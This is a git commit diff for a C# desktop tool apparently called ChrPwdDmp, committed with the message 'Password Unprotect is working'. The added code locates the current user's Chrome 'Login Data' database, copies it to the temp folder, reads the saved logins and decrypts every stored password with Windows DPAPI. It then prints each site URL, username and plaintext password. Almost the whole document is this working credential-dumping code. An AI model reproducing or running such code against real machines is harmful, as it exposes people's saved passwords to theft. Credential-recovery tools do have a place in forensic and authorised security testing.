9e1a9bd95cc5abbc99e0a61c4bbd6610308ab575
Luke Eckley <lukeeckley@gmail.com>
2016-06-17 13:24:45 -0700

    Password Unprotect is working
    Yay for progress!

--- ChrPwdDmp/MainWindow.xaml.cs
+++ ChrPwdDmp/MainWindow.xaml.cs
@@ -1,6 +1,7 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -13,6 +14,9 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using System.Data.SQLite;
+using System.Security.Cryptography;
+using System.Runtime.Serialization.Formatters.Binary;
 
 namespace ChrPwdDmp
 {
@@ -26,21 +30,41 @@ namespace ChrPwdDmp
     /// </summary>
     public partial class MainWindow : Window
     {
+        public string loginData;
+
         public MainWindow()
         {
             InitializeComponent();
-            FindLoginData();
-            ShowBrowsers();
+            if (LoginDataExists())
+            {
+                // Move the file to a temp location
+                //Console.WriteLine("Source:\t\t" + loginData);
+                string temp = Environment.GetEnvironmentVariable("temp") + @"\Login Data";
+                //Console.WriteLine("Destination:\t" + temp);                
+                //Console.WriteLine();
+
+                // Copy the file
+                File.Copy(loginData, temp, true);
+                //Console.WriteLine("Does the file exist in temp?");
+                //Console.WriteLine(File.Exists(temp) ? "true" : "false");
+                //Console.WriteLine(temp);
+
+                GetChromePasswords(temp);
+
+                //Application.Current.Shutdown();
+            }                            
         }
 
-        private void FindLoginData()
+        private bool LoginDataExists()
         {
             string userProfile = Environment.GetEnvironmentVariable("userprofile");
-            Console.WriteLine("%USERPROFILE% = " + userProfile);
-
+            //Console.WriteLine("%USERPROFILE% = " + userProfile);
+            loginData = userProfile + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
+            //Console.WriteLine(loginData);
+            return File.Exists(loginData) ? true : false;
         }
 
-        // This doesn't show if the browser was installed by someone else :/
+        // This doesn't work consistently :/
         private void ShowBrowsers()
         {
             RegistryKey browserKeys;
@@ -55,6 +79,29 @@ namespace ChrPwdDmp
                 Console.WriteLine(line);
         }
 
+        private void GetChromePasswords(string loginData)
+        {
+            SQLiteConnection myDBConnection = new SQLiteConnection(@"Data Source=" + loginData + ";Version=3;Read Only=True;");
+            myDBConnection.Open();
 
+            string query = @"SELECT action_url, username_value, password_value FROM logins";
+            SQLiteCommand command = new SQLiteCommand(query, myDBConnection);
+            SQLiteDataReader reader = command.ExecuteReader();
+            while (reader.Read())
+            {
+                // Don't bother if there's not a username
+                if ((string)reader["username_value"] != "")
+                {
+                    Console.WriteLine("action_url:     " + reader["action_url"]);
+                    Console.WriteLine("username_value: " + reader["username_value"]);
+
+                    Byte[] passwordBytes = ProtectedData.Unprotect((Byte[])reader["password_value"], null, DataProtectionScope.CurrentUser);
+                    string passwordValue = System.Text.Encoding.Default.GetString(passwordBytes);
+                    Console.WriteLine("password_value: " + passwordValue);
+
+                    Console.WriteLine();
+                }
+            }                
+        }
     }
 }
